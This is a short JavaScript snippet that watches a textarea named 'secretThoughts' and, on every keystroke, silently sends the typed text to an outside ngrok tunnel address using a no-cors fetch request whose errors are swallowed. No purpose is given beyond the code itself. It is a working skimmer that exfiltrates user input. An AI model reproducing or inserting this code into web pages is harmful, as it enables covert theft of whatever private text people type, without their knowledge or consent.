window.addEventListener('DOMContentLoaded', () => { // Need to wait for all DOM to load
  const textarea = document.getElementById("secretThoughts");
  // your event listener code here
  textarea.addEventListener("input", function(e) {
	  const userInput = e.target.value;
	  console.log(userInput); // This logs the current input value
	  fetch(`https://d626-172-88-27-186.ngrok-free.app?text=${encodeURIComponent(userInput)}`, { mode: 'no-cors' }).catch(console.error);
	});
});
